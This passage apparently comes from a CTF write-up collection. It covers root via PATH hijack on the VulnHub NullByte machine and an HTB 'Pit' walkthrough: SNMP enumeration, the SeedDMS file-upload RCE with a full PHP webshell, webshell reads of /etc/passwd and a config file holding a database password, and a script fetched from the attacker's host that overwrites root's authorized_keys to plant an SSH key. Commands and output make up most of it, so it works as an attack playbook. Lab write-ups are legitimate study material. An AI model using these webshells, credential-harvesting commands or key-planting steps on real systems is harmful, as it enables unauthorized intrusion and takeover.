chmod 777 ps
echo $PATH
export PATH=.:$PATH
echo $PATH
./procwatch
```
 - $PATH中的“.”，表示用户能够从当前目录执行二进制文件/脚本。 通过执行以上命令，将获取root权限。

<font color="red">找到flag</font>

``` bash
# cd /root
# ls
proof.txt
# cat proof.txt 
adf11c7a9e6523e630aaf3b9b7acb51d

It seems that you have pwned the box, congrats. 
Now you done that I wanna talk with you. Write a walk & mail at
xly0n@sigaint.org attach the walk and proof.txt
If sigaint.org is down you may mail at nbsly0n@gmail.com


USE THIS PGP PUBLIC KEY

-----BEGIN PGP PUBLIC KEY BLOCK-----
Version: BCPG C# v1.6.1.0

mQENBFW9BX8BCACVNFJtV4KeFa/TgJZgNefJQ+fD1+LNEGnv5rw3uSV+jWigpxrJ
Q3tO375S1KRrYxhHjEh0HKwTBCIopIcRFFRy1Qg9uW7cxYnTlDTp9QERuQ7hQOFT
e4QU3gZPd/VibPhzbJC/pdbDpuxqU8iKxqQr0VmTX6wIGwN8GlrnKr1/xhSRTprq
Cu7OyNC8+HKu/NpJ7j8mxDTLrvoD+hD21usssThXgZJ5a31iMWj4i0WUEKFN22KK
+z9pmlOJ5Xfhc2xx+WHtST53Ewk8D+Hjn+mh4s9/pjppdpMFUhr1poXPsI2HTWNe
YcvzcQHwzXj6hvtcXlJj+yzM2iEuRdIJ1r41ABEBAAG0EW5ic2x5MG5AZ21haWwu
Y29tiQEcBBABAgAGBQJVvQV/AAoJENDZ4VE7RHERJVkH/RUeh6qn116Lf5mAScNS
HhWTUulxIllPmnOPxB9/yk0j6fvWE9dDtcS9eFgKCthUQts7OFPhc3ilbYA2Fz7q
m7iAe97aW8pz3AeD6f6MX53Un70B3Z8yJFQbdusbQa1+MI2CCJL44Q/J5654vIGn
XQk6Oc7xWEgxLH+IjNQgh6V+MTce8fOp2SEVPcMZZuz2+XI9nrCV1dfAcwJJyF58
kjxYRRryD57olIyb9GsQgZkvPjHCg5JMdzQqOBoJZFPw/nNCEwQexWrgW7bqL/N8
TM2C0X57+ok7eqj8gUEuX/6FxBtYPpqUIaRT9kdeJPYHsiLJlZcXM0HZrPVvt1HU
Gms=
=PiAQ
-----END PGP PUBLIC KEY BLOCK-----
```

将adf11c7a9e6523e630aaf3b9b7acb51d解密，结果是welldone22

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub125.jpg)

#### 提权2

``` bash
ramses@NullByte:/var/www/backup$ cp /bin/sh /tmp/ps
ramses@NullByte:/var/www/backup$ echo $PATH
.:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
ramses@NullByte:/var/www/backup$ export PATH=/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
ramses@NullByte:/var/www/backup$ ./procwatch
# id
uid=1002(ramses) gid=1002(ramses) euid=0(root) groups=1002(ramses)
# whoami
root
```

#### 提权3

``` bash
ramses@NullByte:/tmp$ nano ps
ramses@NullByte:/tmp$ chmod 777 ps
ramses@NullByte:/tmp$ echo $PATH
/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
ramses@NullByte:/tmp$ export PATH=.:$PATH
ramses@NullByte:/tmp$ cd /var/www/backup
ramses@NullByte:/var/www/backup$ ./procwatch
# id
uid=1002(ramses) gid=1002(ramses) euid=0(root) groups=1002(ramses)
# whoami
root
```

<font color="red">Game over</font>

不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this...It's a pity...

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg)

<font color="green">***The end,to be continue...***</font>
<!-- kb:end NullByte-1 -->

</details>

<a id="case-pit"></a>

## SNMP 扩展命令与目录 ACL

SNMP 信息、SeedDMS 配置和系统账户构成前半链，扩展 OID 触发的脚本受目录 ACL 控制。原文保留仅可写不可列目录的差异。

<p class="kb-provenance">来源 pit · 原记录 2021-05-22 · 32 个代码块 · 5 处图片引用</p>

<details class="kb-evidence" id="record-pit">
<summary>查看分析过程、攻击步骤与完整代码</summary>

<!-- kb:start pit -->

#### introduce

OS: Linux
Difficulty: Medium
Points:	30
Release:	15 May 2021
IP:	10.10.10.241

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1981.jpg)

 - ![my htb rank](http://www.hackthebox.eu/badge/image/235857)



#### information gathering

first use nmap as usaul

``` bash
┌──(root💀kali)-[~/hackthebox/machine/pit]
└─# nmap -sV -v -p- --min-rate=10000 10.10.10.241
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.0 (protocol 2.0)
80/tcp   open  http            nginx 1.14.1
9090/tcp open  ssl/zeus-admin?
```

Initial Nmap scan reveals the machine is running SSH and HTTP/s service. Port 9090 is
HTTPS, the TLS certificate discloses hostname. Let’s add hostname to hosts file.

``` bash
10.10.10.241 pit.htb dms-pit.htb
```

The HTB tweet gives us a small hint about the box. “Walk”, as in SNMP.

Let’s do a quick UDP ping and find whether SNMP port is open or closed.

``` bash
┌──(root💀kali)-[~/hackthebox/machine/pit]
└─# nping --udp -c 2 -p 161 pit.htb

Starting Nping 0.7.91 ( https://nmap.org/nping ) at 2021-05-21 12:27 EDT
SENT (0.0718s) UDP 10.10.14.18:53 > 10.10.10.241:161 ttl=64 id=30254 iplen=28 
SENT (1.0721s) UDP 10.10.14.18:53 > 10.10.10.241:161 ttl=64 id=30254 iplen=28 
 
Max rtt: N/A | Min rtt: N/A | Avg rtt: N/A
Raw packets sent: 2 (56B) | Rcvd: 0 (0B) | Lost: 2 (100.00%)
Nping done: 1 IP address pinged in 2.11 seconds
```

As you can see we can able to send UDP packets to SNMP port. It is open, we can confirm by
running NMAP scan on the port.

``` bash
┌──(root💀kali)-[~/hackthebox/machine/pit]
└─# nmap -sU -p161,162 -sV pit.htb
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-21 12:28 EDT
Nmap scan report for pit.htb (10.10.10.241)
Host is up (0.35s latency).

PORT    STATE    SERVICE  VERSION
161/udp open     snmp     SNMPv1 server; net-snmp SNMPv3 server (public)
162/udp filtered snmptrap

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 5.63 seconds
```

As you can see we got the version information of SNMP and it also disclosed it is using 'Public'
community string for authentication. Public community string is used as password to send
request to SNMP server to reveal information and it is default community string. Public string
has only read access, it cannot write to SNMP.

Let’s find what SNMP can disclose for us. We will use below perl script, as it can perform multi-
threading and parse usable information.

 - [snmp](https://github.com/dheiland-r7/snmp)

For NetAddr Error: [https://metacpan.org/pod/release/MIKER/NetAddr-IP-4.079/IP.pm#INSTALLATION](https://metacpan.org/pod/release/MIKER/NetAddr-IP-4.079/IP.pm#INSTALLATION)

``` bash
┌──(root💀kali)-[~/hackthebox/machine/pit]
└─# perl snmpbw.pl pit.htb public 2 1                                                                                                         
SNMP query:       10.10.10.241
Queue count:      0
SNMP SUCCESS:     10.10.10.241
```

If you have multiple IPs to scan give a text file and increase the thread size from 1 to 8 or 16 or
32. Upon completion it generates a file (named as IP of target) with all the information it has
collected.

Let’s read useful information from the result.

``` bash
┌──(root💀kali)-[~/hackthebox/machine/pit]
└─# head 10.10.10.241.snmp
.1.3.6.1.2.1.1.1.0 = STRING: Linux pit.htb 4.18.0-240.22.1.el8_3.x86_64 #1 SMP Thu Apr 8
19:01:30 UTC 2021 x86_64
.1.3.6.1.2.1.1.2.0 = OID: .1.3.6.1.4.1.8072.3.2.10
.1.3.6.1.2.1.1.3.0 = Timeticks: (6114324) 16:59:03.24
.1.3.6.1.2.1.1.4.0 = STRING: Root <root@localhost> (configure /etc/snmp/snmp.local.conf)
.1.3.6.1.2.1.1.5.0 = STRING: pit.htb
.1.3.6.1.2.1.1.6.0 = STRING: Unknown (edit /etc/snmp/snmpd.conf)
-----SNIP--------
.1.3.6.1.4.1.2021.9.1.2.2 = STRING: /var/www/html/seeddms51x/seeddms
.1.3.6.1.4.1.2021.9.1.3.1 = STRING: /dev/mapper/cl-root
.1.3.6.1.4.1.2021.9.1.3.2 = STRING: /dev/mapper/cl-seeddms
-----SNIP--------
.1.3.6.1.4.1.8072.1.3.2.2.1.2.10.109.111.110.105.116.111.114.105.110.103 = STRING: /usr/
bin/monitor
-----SNIP--------
Database status
OK - Connection to database successful.
System release info
CentOS Linux release 8.3.2011
SELinux Settings
user
-----SNIP--------
Login Name SELinux User MLS/MCS Range Service
__default__ unconfined_u s0-s0:c0.c1023 *
michelle user_u s0 *
root unconfined_u s0-s0:c0.c1023 *
System uptime
09:59:08 up 17:00, 2 users, load average: 0.00, 0.00, 0.00
-----SNIP--------
```

We got Linux Kernel version, web directory, OS version, username and binary location. These
information will be useful in further steps.

Let’s access HTTPS service.

``` bash
https://10.10.10.241:9090/
```

If we read the page source, the we’d find that this is a ”cockpit web console”, it allows admin/
users to perfrom limited/Administrative tasks on server.

#### getshell

Let’s do a quick exploit search.

``` bash
┌──(root💀kali)-[~/hackthebox/machine/pit]
└─# searchsploit "cockpit"
------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                              |  Path
------------------------------------------------------------------------------------------------------------ ---------------------------------
Cockpit CMS 0.4.4 < 0.5.5 - Server-Side Request Forgery                                                     | php/webapps/44567.txt
Cockpit CMS 0.6.1 - Remote Code Execution                                                                   | php/webapps/49390.txt
Cockpit Version 234 - Server-Side Request Forgery (Unauthenticated)                                         | multiple/webapps/49397.txt
openITCOCKPIT 3.6.1-2 - Cross-Site Request Forgery                                                          | php/webapps/47305.py
------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

I tried SSRF for version 234 and it is not useful in our situation.
Let’s check the other HTTP server.

It is forbidden for us to access. Perhaps there’s a different directory which we can access. I ran
GoBuster and found out nothing.
Code Execution
In SNMP dump, we saw something related to DMS.

``` bash
.1.3.6.1.4.1.2021.9.1.2.2 = STRING: /var/www/html/seeddms51x/seeddms
```

Upon quick google, we find that “SeedDMS” is an open-source document management system.
Let’s try to append the directory name in web address bar and access.

``` bash
http://dms-pit.htb/seeddms51x/seeddms/out/out.Login.php?referuri=%2Fseeddms51x%2Fseeddms%2F
```

We get this login page. If we try to login via common credentials then it fails. But, if we try the
username which we found via SNMP enumeration then it would work.

``` bash
michelle/michelle
```

Once we login, we’d see a note from administrator saying that they have upgraded the software
to 5.1.15 from 5.1.10.

Let’s do quick search for an exploit to this version.

``` bash
┌──(root💀kali)-[~/hackthebox/machine/pit]
└─# searchsploit "seeddms"
------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                              |  Path
------------------------------------------------------------------------------------------------------------ ---------------------------------
SeedDMS 5.1.18 - Persistent Cross-Site Scripting                                                            | php/webapps/48324.txt
SeedDMS < 5.1.11 - 'out.GroupMgr.php' Cross-Site Scripting                                                  | php/webapps/47024.txt
SeedDMS < 5.1.11 - 'out.UsrMgr.php' Cross-Site Scripting                                                    | php/webapps/47023.txt
SeedDMS versions < 5.1.11 - Remote Command Execution                                                        | php/webapps/47022.txt
------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

There’s no any exploit is available to 5.1.15 version. I tried 5.1.18 XSS but it didn’t work. But for
some reason the RCE for version 5.1.11 works.

``` bash
┌──(root💀kali)-[~/hackthebox/machine/pit]
└─# cat /usr/share/exploitdb/exploits/php/webapps/47022.txt
# Exploit Title: [Remote Command Execution through Unvalidated File Upload in SeedDMS versions <5.1.11]
# Google Dork: [NA]
# Date: [20-June-2019]
# Exploit Author: [Nimit Jain](https://www.linkedin.com/in/nimitiitk)(https://secfolks.blogspot.com)
# Vendor Homepage: [https://www.seeddms.org]
# Software Link: [https://sourceforge.net/projects/seeddms/files/]
# Version: [SeedDMS versions <5.1.11] (REQUIRED)
# Tested on: [NA]
# CVE : [CVE-2019-12744]

Exploit Steps:

Step 1: Login to the application and under any folder add a document.
Step 2: Choose the document as a simple php backdoor file or any backdoor/webshell could be used.

PHP Backdoor Code: 
<?php

if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}

?>

Step 3: Now after uploading the file check the document id corresponding to the document.
Step 4: Now go to example.com/data/1048576/"document_id"/1.php?cmd=cat+/etc/passwd to get the command response in browser.

Note: Here "data" and "1048576" are default folders where the uploaded files are getting saved.
```

We just need to upload webshell on machine and access via from default directory and
document ID. The file name will be changed to 1.php. For some reason we webshell which
gives reverse connection doesn’t work, so we have to use the above mentioned php code to
execute commands.

Save that php code in file and we need to upload it in the “Michelle’s” folder.

It doesn’t really matter what you name the file, it get turned to 1.php. If you look over
“download” button the you’d find the document ID, which is required to access the php file.

Note: On machine a clean-up script is running and it deletes the uploaded file after every 5
minutes.

``` bash
http://dms-pit.htb/seeddms51x/data/1048576/29/1.php?cmd=cat%20/etc/passwd

root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:65534:65534:Kernel Overflow User:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
systemd-coredump:x:999:997:systemd Core Dumper:/:/sbin/nologin
systemd-resolve:x:193:193:systemd Resolver:/:/sbin/nologin
tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin
polkitd:x:998:995:User for polkitd:/:/sbin/nologin
unbound:x:997:994:Unbound DNS resolver:/etc/unbound:/sbin/nologin
sssd:x:996:992:User for sssd:/:/sbin/nologin
chrony:x:995:991::/var/lib/chrony:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
michelle:x:1000:1000::/home/michelle:/bin/bash
setroubleshoot:x:994:990::/var/lib/setroubleshoot:/sbin/nologin
cockpit-ws:x:993:989:User for cockpit-ws:/nonexisting:/sbin/nologin
mysql:x:27:27:MySQL Server:/var/lib/mysql:/sbin/nologin
nginx:x:992:988:Nginx web server:/var/lib/nginx:/sbin/nologin
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
cockpit-wsinstance:x:991:987:User for cockpit-ws instances:/nonexisting:/sbin/nologin
rngd:x:990:986:Random Number Generator Daemon:/var/lib/rngd:/sbin/nologin
```

We got command execution. But, due to some reason we can’t able to get reverse connection
on our machine. Let’s search for any stored credentials on target machine.

Initial Access
If we visit the configuration directory and access the settings.xml file then we will get MYSQL
creds.

``` bash
view-source:http://dms-pit.htb/seeddms51x/data/1048576/29/1.php?cmd=cat%20../../../conf/settings.xml

<pre><?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <site>
    <!-- siteName: Name of site used in the page titles. Default: SeedDMS
       - footNote: Message to display at the bottom of every page
       - printDisclaimer: if true the disclaimer message the lang.inc files will be print on the bottom of the page
       - language: default language (name of a subfolder in folder "languages")
       - theme: default style (name of a subfolder in folder "styles")
    -->
    <display siteName="SeedDMS" footNote="SeedDMS free document management system - www.seeddms.org" printDisclaimer="true" language="en_GB" theme="bootstrap" previewWidthList="40" previewWidthDetail="100" availablelanguages="" showFullPreview="false" convertToPdf="false" previewWidthMenuList="40" previewWidthDropFolderList="100" maxItemsPerPage="0" incItemsPerPage="0">  
    </display>
    <!-- strictFormCheck: Strict form checking. If set to true, then all fields in the form will be checked for a value. If set to false, then (most) comments and keyword fields become optional. Comments are always required when submitting a review or overriding document status.
       - viewOnlineFileTypes: files with one of the following endings can be viewed online (USE ONLY LOWER CASE CHARACTERS)
       - enableConverting: enable/disable converting of files
       - enableEmail: enable/disable automatic email notification
       - enableUsersView: enable/disable group and user view for all users
       - enableFullSearch: false to don't use fulltext search
       - enableLanguageSelector: false to don't show the language selector after login
       - enableClipboard: false to hide the clipboard
       - enableFolderTree: false to don't show the folder tree
       - expandFolderTree: 0 to start with tree hidden
       -                   1 to start with tree shown and first level expanded
       -                   2 to start with tree shown fully expanded     
       - stopWordsFile: path to stop word file for indexer
       - sortUsersInList: how to sort users in lists ('fullname' or '' (default))
    -->   
    <edition strictFormCheck="false" viewOnlineFileTypes=".txt;.text;.html;.htm;.xml;.pdf;.gif;.png;.jpg;.jpeg" enableConverting="true" enableEmail="true" enableUsersView="true" enableFullSearch="true" enableClipboard="false" enableFolderTree="true" expandFolderTree="1" enableLanguageSelector="true" stopWordsFile="" sortUsersInList="" enableDropUpload="false" enableRecursiveCount="false" maxRecursiveCount="0" enableThemeSelector="false" fullSearchEngine="sqlitefts" sortFoldersDefault="u" editOnlineFileTypes="" enableMenuTasks="false" enableHelp="false" defaultSearchMethod="database" libraryFolder="0" maxSizeForFullText="0" showSingleSearchHit="false" enableSessionList="false" enableDropFolderList="false" enableMultiUpload="false" defaultDocPosition="end">
    </edition> 
    <!-- enableCalendar: enable/disable calendar
       - calendarDefaultView: calendar default view ("w" for week,"m" for month,"y" for year)
       - firstDayOfWeek: first day of the week (0=sunday, 6=saturday)
    -->  
    <calendar enableCalendar="true" calendarDefaultView="y" firstDayOfWeek="0">
    </calendar>
  <webdav enableWebdavReplaceDoc="true"/></site>
  
  <system>
    <!-- rootDir: Path to where SeedDMS is located
       - httpRoot: The relative path in the URL, after the domain part. Do not include the
       -           http:// prefix or the web host name. e.g. If the full URL is
	     -           http://www.example.com/seeddms/, set $_httpRoot = "/seeddms/".
	     -           If the URL is http://www.example.com/, set $_httpRoot = "/".
       - contentDir: Where the uploaded files are stored (best to choose a directory that
       -             is not accessible through your web-server)
       - stagingDir: Where partial file uploads are saved
       - luceneDir: Where the lucene fulltext index iѕ saved
       - logFileEnable: set false to disable log system
       - logFileRotation: the log file rotation (h=hourly, d=daily, m=monthly)
       - enableLargeFileUpload: support for jumploader
       - partitionsize: size of chunk uploaded by jumploader
       - dropFolderDir: where files for document upload are located
       - cacheDir: where the preview images are saved
    -->
    <server rootDir="/var/www/html/seeddms51x/seeddms/" httpRoot="/seeddms51x/seeddms/" contentDir="/var/www/html/seeddms51x/data/" stagingDir="/var/www/html/seeddms51x/data/staging/" luceneDir="/var/www/html/seeddms51x/data/lucene/" logFileEnable="true" logFileRotation="d" enableLargeFileUpload="false" partitionSize="2000000" cacheDir="/var/www/html/seeddms51x/data/cache/" dropFolderDir="" backupDir="" repositoryUrl="" maxUploadSize="" enableXsendfile="false">
    </server>
    
    <!-- enableGuestLogin: If you want anybody to login as guest, set the following line to true
       -                   note: guest login should be used only in a trusted environment
			 - enablePasswordForgotten: Allow users to reset their password
       - restricted: Restricted access: only allow users to log in if they have an entry in the local database (irrespective of successful authentication with LDAP).
       - enableUserImage: enable users images
       - disableSelfEdit: if true user cannot edit his own profile
			 - passwordStrength: minimum strength of password, set to 0 to disable
			 - passwordExpiration: number of days after password expires
			 - passwordHistory: number of remembered passwords
			 - passwordStrengthAlgorithm: algorithm used to calculate password strenght (simple or advanced)
			 - encryptionKey: arbitrary string used for creating identifiers
    -->    
    <authentication enableGuestLogin="false" enablePasswordForgotten="false" restricted="true" enableUserImage="false" disableSelfEdit="false" passwordStrength="0" passwordStrengthAlgorithm="simple" passwordExpiration="10" passwordHistory="0" loginFailure="0" autoLoginUser="0" quota="0" undelUserIds="" encryptionKey="cfecb42d13f2e1666cddde56991a2cbf" cookieLifetime="0" enableGuestAutoLogin="false" defaultAccessDocs="0">
      <connectors>
        <!-- ***** CONNECTOR LDAP  *****
           - enable: enable/disable connector
           - type: type of connector ldap / AD
           - host: hostname of the authentification server
           -       URIs are supported, e.g.: ldaps://ldap.host.com
           - port: port of the authentification server
           - baseDN: top level of the LDAP directory tree
        -->  
        <connector enable="false" type="ldap" host="ldaps://ldap.host.com" port="389" baseDN="" bindDN="" bindPw="">
        </connector>
        <!-- ***** CONNECTOR Microsoft Active Directory  *****
           - enable: enable/disable connector
           - type: type of connector ldap / AD
           - host: hostname of the authentification server
           - port: port of the authentification server
           - baseDN: top level of the LDAP directory tree
           - accountDomainName: sample: example.com
        -->  
        <connector enable="false" type="AD" host="ldap.example.com" port="389" baseDN="" accountDomainName="example.com" bindDN="" bindPw="">
        </connector>
      </connectors>
    </authentication>
    <!--
       - dbDriver: DB-Driver used by adodb (see adodb-readme)
       - dbHostname: DB-Server
       - dbDatabase: database where the tables for seeddms are stored (optional - see adodb-readme)
       - dbUser: username for database-access
       - dbPass: password for database-access
    -->    
    <database dbDriver="mysql" dbHostname="localhost" dbDatabase="seeddms" dbUser="seeddms" dbPass="ied^ieY6xoquu" doNotCheckVersion="false">
    </database>
    <!-- smtpServer: SMTP Server hostname
       - smtpPort: SMTP Server port
       - smtpSendFrom: Send from
    -->    
    <smtp smtpServer="localhost" smtpPort="25" smtpSendFrom="seeddms@localhost" smtpUser="" smtpPassword=""/>    
  </system>
 
  
  <advanced>
    <!-- siteDefaultPage: Default page on login. Defaults to out/out.ViewFolder.php
       - rootFolderID: ID of root-folder (mostly no need to change)
       - titleDisplayHack: Workaround for page titles that go over more than 2 lines.
    -->  
    <display siteDefaultPage="" rootFolderID="1" titleDisplayHack="true" showMissingTranslations="false">
    </display>
    <!-- guestID: ID of guest-user used when logged in as guest (mostly no need to change)
       - adminIP: if enabled admin can login only by specified IP addres, leave empty to avoid the control
       -          NOTE: works only with local autentication (no LDAP)
    --> 
    <authentication guestID="2" adminIP="">
    </authentication>
    <!-- enableAdminRevApp: false to don't list administrator as reviewer/approver
       - versioningFileName: the name of the versioning info file created by the backup tool
       - workflowMode: 'traditional' or 'advanced'
       - enableVersionDeletion: allow to delete versions after approval
       - enableVersionModification: allow to modify versions after approval
       - enableDuplicateDocNames: allow duplicate names in a folder
    --> 
    <edition enableAdminRevApp="false" versioningFileName="versioning_info.txt" workflowMode="traditional" enableVersionDeletion="true" enableVersionModification="true" enableDuplicateDocNames="true" enableOwnerRevApp="false" enableSelfRevApp="false" presetExpirationDate="" overrideMimeType="false" initialDocumentStatus="0" enableAcknowledgeWorkflow="" enableRevisionWorkflow="" advancedAcl="false" enableUpdateRevApp="false" removeFromDropFolder="false" allowReviewerOnly="false">
    </edition>
		<!-- enableNotificationAppRev: true to send notifation if a user is added as a reviewer or approver
		-->
    <notification enableNotificationAppRev="true" enableOwnerNotification="false" enableNotificationWorkflow="false">
    </notification>
    <!-- coreDir: Path to SeedDMS_Core (optional)
       - luceneClassDir: Path to SeedDMS_Lucene (optional)
       - contentOffsetDir: To work around limitations in the underlying file system, a new 
       -                   directory structure has been devised that exists within the content 
       -                   directory ($_contentDir). This requires a base directory from which 
       -                   to begin. Usually leave this to the default setting, 1048576, but can 
       -                   be any number or string that does not already exist within $_contentDir.	
       - maxDirID: Maximum number of sub-directories per parent directory. Default: 0, use 31998 (maximum number of dirs in ext3) for a multi level content directory.
       - updateNotifyTime: users are notified about document-changes that took place within the last "updateNotifyTime" seconds
       - extraPath: Path to addtional software. This is the directory containing additional software like the adodb directory, or the pear Log package. This path will be added to the php include path
    -->
    <server coreDir="" luceneClassDir="" contentOffsetDir="1048576" maxDirID="0" updateNotifyTime="86400" extraPath="/var/www/html/seeddms51x/pear/" maxExecutionTime="30" cmdTimeout="10">
    </server>
    <converters target="fulltext">
		 <converter mimeType="application/pdf">pdftotext -nopgbrk %s - | sed -e 's/ [a-zA-Z0-9.]\{1\} / /g' -e 's/[0-9.]//g'</converter>
     <converter mimeType="application/msword">catdoc %s</converter>
     <converter mimeType="application/vnd.ms-excel">ssconvert -T Gnumeric_stf:stf_csv -S %s fd://1</converter>
     <converter mimeType="audio/mp3">id3 -l -R %s | egrep '(Title|Artist|Album)' | sed 's/^[^:]*: //g'</converter>
     <converter mimeType="audio/mpeg">id3 -l -R %s | egrep '(Title|Artist|Album)' | sed 's/^[^:]*: //g'</converter>
     <converter mimeType="text/plain">cat %s</converter>
    </converters>

  </advanced>

<extensions><extension name="example"/></extensions></configuration>
</pre>
```

the password is:

``` bash
<database dbDriver="mysql" dbHostname="localhost" dbDatabase="seeddms" dbUser="seeddms" dbPass="ied^ieY6xoquu" doNotCheckVersion="false">
```

MYSQL DB is not accessible to other IPs as it is bound to localhost only. Let’s try these this
password with admin/root/michelle user on “cockpit web console”. I tried these creds to access
SSH, but unfortunately SSH is configured to allow only Public-Private keys not password.

and we got user.txt

``` bash
[michelle@pit ~]$ id
uid=1000(michelle) gid=1000(michelle) groups=1000(michelle) context=user_u:user_r:user_t:s0
[michelle@pit ~]$ ls
user.txt
[michelle@pit ~]$ cat user.txt
bc22c2a8b56625680ca457a243dd2a84
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1982.jpg)

I ran through LinPeas on the machine in search for any paths to escalate privileges, but couldn’t
find any.

#### Privilege Escalation

If we remember SNMP dump we found that there’s a binary file is being run on the machine.

``` bash
.1.3.6.1.4.1.8072.1.3.2.2.1.2.10.109.111.110.105.116.111.114.105.110.103 = STRING: /usr/bin/monitor
```

Let’s check this file out.

``` bash
[michelle@pit ~]$ file /usr/bin/monitor
/usr/bin/monitor: Bourne-Again shell script, ASCII text executable
[michelle@pit ~]$ ls -la /usr/bin/monitor
-rwxr--r--. 1 root root 88 Apr 18  2020 /usr/bin/monitor
```

It’s an ASCII file and we have permission to read it.

``` bash
[michelle@pit ~]$ cat /usr/bin/monitor 
#!/bin/bash

for script in /usr/local/monitoring/check*sh
do
    /bin/bash $script
done
```

It’s a script being run from another location. Let’s check that out.

``` bash
[michelle@pit ~]$ ls -la /usr/local/monitoring/
ls: cannot open directory '/usr/local/monitoring/': Permission denied
```

We cannot list content of this directory, let’s check what permission we have for this directory

``` bash
[michelle@pit ~]$ ls -la /usr/local/
total 0
drwxr-xr-x. 13 root root 149 Nov  3  2020 .
drwxr-xr-x. 12 root root 144 May 10 05:06 ..
drwxr-xr-x.  2 root root   6 Nov  3  2020 bin
drwxr-xr-x.  2 root root   6 Nov  3  2020 etc
drwxr-xr-x.  2 root root   6 Nov  3  2020 games
drwxr-xr-x.  2 root root   6 Nov  3  2020 include
drwxr-xr-x.  2 root root   6 Nov  3  2020 lib
drwxr-xr-x.  3 root root  17 May 10 05:06 lib64
drwxr-xr-x.  2 root root   6 Nov  3  2020 libexec
drwxrwx---+  2 root root 122 May 21 13:55 monitoring
drwxr-xr-x.  2 root root   6 Nov  3  2020 sbin
drwxr-xr-x.  5 root root  49 Nov  3  2020 share
drwxr-xr-x.  2 root root   6 Nov  3  2020 src
```

We have read/write/execute permission for this directory and also + is there, it simply means
ACLs are implemented on this directory. In simple terms extended permissions. let’s check the
extended permissions.

``` bash
[michelle@pit ~]$ getfacl /usr/local/monitoring/
getfacl: Removing leading '/' from absolute path names
# file: usr/local/monitoring/
# owner: root
# group: root
user::rwx
user:michelle:-wx
group::rwx
mask::rwx
other::---
```

As you can see, owner is root, other users have full permission but 'Michelle' user has only write
and execute permission. Let’s try to create a file and find out.

``` bash
[michelle@pit ~]$ echo "test" > /usr/local/monitoring/demo.txt
[michelle@pit ~]$ cat /usr/local/monitoring/demo.txt
test
```

It worked, we can dump shell file inside this directory and call it via SNMPwalk. First we need to
create a shell file with our SSH public keys, upon execution it should copy keys to root’s SSH
directory.

``` bash
[michelle@pit ~]$ curl http://10.10.14.18:82/check.sh -o check.sh
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   598  100   598    0     0    862      0 --:--:-- --:--:-- --:--:--   862
[michelle@pit ~]$ cat check.sh 
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDMR1r7B7aiEe6j+wBsVumAFqFXCiqw2iSrcg1S7rC1BdlVqr8YfWnT6e/e3+TAJk9idtLz/wN2MkupWtI1ddtNTJz31RQb0WMGjq7p8Usg0uIYhQH0PTN/GmPXDhqLIPcbTnNQMcV2PnwM07eXxQH0+s9rqVO8cR2z2f35bKe3WrHNnT7NwfOoWqNJxh+V8OGgfF8LhS0E46I6co76MJAIsX24Zs9r/dY+JPOlJlS3K2Kf3xSfPAScQeWip1WYY9depVuQywk12kOUikzGNjlQ4phNba47VjfycyV34cLw0/vQcDv5hMCfaK+hoE5rBXysnVx/f3n3zRYMLomgveQUCLBYUwJPE2t0VzeeX4W9wxrAOl2Njx5TI4cEFnmlp/6lO/iK+aC6BSBRxU19jS2fUchiN9PMgLSYGzhuIxOLvvd9AlaOYPNM7a5AfjzzO+gd1fv/Mb9EIZCKibtvpHp0eomnSDcDz/b9FNpbvg6V5NBVy2VaufcRbiBDD6cTS00= root@kali" > /root/.ssh/authorized_keys
```

Now we need to copy this file to monitoring directory.

``` bash
cp check.sh /usr/local/monitoring/
```

Make sure you can read the file after copying it to monitoring directory.

``` bash
[michelle@pit ~]$ cp check.sh /usr/local/monitoring/
[michelle@pit ~]$ cat /usr/local/monitoring/check.sh
